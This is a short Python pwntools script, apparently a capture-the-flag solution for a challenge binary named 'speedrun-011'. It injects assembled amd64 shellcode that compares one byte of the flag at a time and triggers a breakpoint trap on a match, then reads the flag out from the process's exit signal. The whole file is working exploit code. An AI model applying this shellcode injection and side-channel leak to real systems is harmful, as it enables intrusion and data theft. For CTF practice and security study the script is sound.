from pwn import *
import time
import subprocess

context.log_level = 'warning'

flag = ""
for i in range(1, 100):
    for c in range(ord(" "), ord("}")):
        shellcode = asm(
            """
            mov al, byte [rdi + {}]
            cmp al, {}
            jnz bye
            int3
            bye:
            ret
            """.format(i, c),
            arch='amd64'
        )
        if '\x00' in shellcode:
            print(disasm(shellcode, arch='amd64'))
        sock = process("./speedrun-011")
        sock.recvuntil("vehicle\n")
        sock.sendline(shellcode)
        while True:
            x = sock.poll()
            if x is not None:
                break
        sock.close()
        if x == -5:
            flag += chr(c)
            break
    else:
        print("...?")
        exit()
    print(flag)
